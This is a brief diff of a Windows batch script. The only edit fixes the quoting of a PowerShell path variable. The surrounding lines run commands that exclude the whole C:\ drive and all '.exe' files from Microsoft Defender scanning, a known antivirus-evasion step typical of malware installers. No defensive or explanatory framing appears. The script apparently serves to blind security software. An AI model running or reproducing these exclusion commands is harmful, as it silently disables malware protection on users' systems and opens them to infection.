@@ -8,7 +8,7 @@ chcp 850 > nul
 goto :EOF
 
 :yes
-set powershell="%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe"
+set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
 
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
 powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
